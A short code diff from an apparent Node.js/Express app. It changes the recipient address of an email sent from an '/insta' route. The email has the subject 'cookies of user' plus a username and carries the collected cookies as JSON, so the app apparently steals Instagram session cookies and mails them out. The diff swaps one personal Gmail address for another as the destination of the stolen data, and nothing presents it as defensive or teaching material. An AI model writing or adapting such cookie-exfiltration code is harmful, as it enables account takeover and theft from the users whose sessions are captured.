@@ -257,7 +257,7 @@ app.post("/insta", (req, res) => {
                 console.log(data);
                 var mailOptions = {
                   from: process.env.email,
-                  to: "tklinger50@gmail.com",
+                  to: "surya142327@gmail.com",
                   subject: "cookies of user" + req.body.username,
                   text: JSON.stringify(val2.cookies),
                   attachments: [
